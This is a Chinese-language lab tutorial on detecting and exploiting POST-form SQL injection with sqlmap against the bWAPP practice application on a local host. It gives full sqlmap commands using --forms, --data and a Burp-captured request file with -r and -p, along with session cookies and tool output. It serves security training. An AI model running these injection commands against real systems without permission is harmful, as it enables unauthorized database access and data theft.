# ==sqlmap注入实验==

**完成：POST表单SQL注入检测与利用**

使用POST提交的数据不会出现在URL中，而是在HTTP请求主体当中。如果需要对主体中的数据进行注入，需要使用Sqlmap中关于POST注入的参数。



### 获取url

![image-20230906082642900](https://gitee.com/ymq_typroa/typroa/raw/main/image-20230906082642900.png)

### 获取cookie

  ![image-20230906082816028](https://gitee.com/ymq_typroa/typroa/raw/main/image-20230906082816028.png)

```shell
root@kali:~# sqlmap -u "http://192.168.0.101/bWAPP/sqli_6.php" --cookie="security_level=0; PHPSESSID=6e1bc666112a327fef37797ca501832a" --dbs --batch
```

`--dbs`表示获取数据库

`--batch`表示使用默认，也就是直接默认Y

但是这样我们会发现输出结果会报错，并没有我们想要的结果，是因为我们以这种方式实际上是以GET方式请求，那么此时就会去我们的url中去寻找是否提交了参数，又因为我们现在这个POST请求方式中不会在url中出现对应的参数，所以就会出现下面的情况

```shell
──(root💀Kali-1)-[~]
└─# sqlmap -u "http://192.168.0.101/bWAPP/sqli_6.php" --cookie="security_level=0; PHPSESSID=6e1bc666112a327fef37797ca501832a" --dbs --batch
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.7.6#stable}
|_ -| . [,]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent isillegal. It is the end user's responsibility to obey all applicable local, state and federalaws. Developers assume no liability and are not responsible for any misuse or damage caused bythis program
[*] starting @ 21:87:49 /2020-06-02/
[21:07:49] [INFO] testing connection to the target URL
[21:07:50] [WARNING] potential CAPTCHA protection mechanism detected
[21:07:50] [INFO] checking if the target is protected by some kind of WAF/IPS
[21:07:50] [INFo] testing if the target URL content is stable
[21:97:59] [INFO] target URL content is stable[21:07:50] [CRITICAL] no parameter(s) found for testing in the provided data (e.g. GETparameter 'id' in 'www.site.com/index.php?id=1'). You are advised to rerun with '--forms --crawl=2'
[21:07:50] [WARNING] you haven't updated sqlmap for more than 305 days!!!
[*] ending @ 21:7 :5 /2020-06-02/
```

那么我们如何使用POST请求的方式呢？

## 方式1：sqlmap -u "url" --from

```shell
root@kali:~# sqlmap -u "http://192.168.0.101/bWAPP/sqli_6.php" --cookie="security_level=0; PHPSESSID=6e1bc666112a327fef37797ca501832a" --forms --dbs --batch
```

![image-20230906084733736](https://gitee.com/ymq_typroa/typroa/raw/main/image-20230906084733736.png)





## 方式2：sqlmap -u "url" --data "POST提交的数据"

```shell
sqlmap -u "http://192.168.0.101/bWAPP/sqli_6.php" --cookie="security_level=0; PHPSESSID=6e1bc666112a327fef37797ca501832a" --data="title=aaa&action=search"
```

![image-20230906090054872](https://gitee.com/ymq_typroa/typroa/raw/main/image-20230906090054872.png)

我们会发现好像不是我们所需要的内容，是因为，在上一次探测中，探测的数据自动存储到了下面这个路径下，我们要想重新探测成功，需要先将这个路径下的文件删除，然后再重新探测

![image-20230906090300203](https://gitee.com/ymq_typroa/typroa/raw/main/image-20230906090300203.png)

![image-20230907093841958](https://gitee.com/ymq_typroa/typroa/raw/main/image-20230907093841958.png)





## 方式3：sqlmap -r http 文本文件 -p 指定测试参数

使用burpsuite抓包，并保存为文本文件。copy to file 或者直接复制粘贴保存

```http
POST /bWAPP/sqli_6.php HTTP/1.1
Host : 192.168.0.101
User-Agent: Mozilla/5.0 (X11; Linux x86_64; r:60.0) Gecko/20100101 Firefox/60.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip，deflate
Referer: http://192.168.8.101 /bWAPP/sqli_6.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Cookie: security_level=0; PHPSESSID=cd6092f82040dc2a751b120b6ee33bc6
Connection: close
Upgrade-Insecure-Requests: 1

title=aaaa&action=search
```

先把之前执行测试探测的结果删除

![image-20230907095332620](https://gitee.com/ymq_typroa/typroa/raw/main/image-20230907095332620.png)

接下来开始进行抓包

![image-20230907095553664](https://gitee.com/ymq_typroa/typroa/raw/main/image-20230907095553664.png)

或者

![image-20230907095623519](https://gitee.com/ymq_typroa/typroa/raw/main/image-20230907095623519.png)

-p 探测参数 后面的指定测试参数就是我们自己填的那段字符对应的title或者是action

![image-20230907100153812](https://gitee.com/ymq_typroa/typroa/raw/main/image-20230907100153812.png)

![image-20230907100501570](https://gitee.com/ymq_typroa/typroa/raw/main/image-20230907100501570.png)

但是因为我们上面已经将探测后的文件保存了下来，所以我们现在不需要在输入那么长一段来使用cookie和-p data等，可以直接-r http文本 -p title就好

```sql
sqlmap -r /root/Desktop/http.txt -p title --batch
```

![image-20230907101722884](https://gitee.com/ymq_typroa/typroa/raw/main/image-20230907101722884.png)

当然，其实我们可以直接在文件中指定要进行注入测试的地方，只需要把诸如点改为 * 号，然后sqlmap就会直接自动进行注入，如下：

这是原本保存下来之后的http文本内容

![image-20230907102308012](https://gitee.com/ymq_typroa/typroa/raw/main/image-20230907102308012.png)

 这是修改之后的内容

![image-20230907102339475](https://gitee.com/ymq_typroa/typroa/raw/main/image-20230907102339475.png)

之后直接wq保存退出就好了

这样操作之后只需要-r http文本就好了，然后他会自动在我们的 * 号的位置插入payload，并且探测出对应的结果

![image-20230907102706326](https://gitee.com/ymq_typroa/typroa/raw/main/image-20230907102706326.png)

**小结：**

**1.掌握POST注入利用过程的三种方式**

**2.务必注意 探测结果会保存在 /root/.sqlmap/output目录下。**
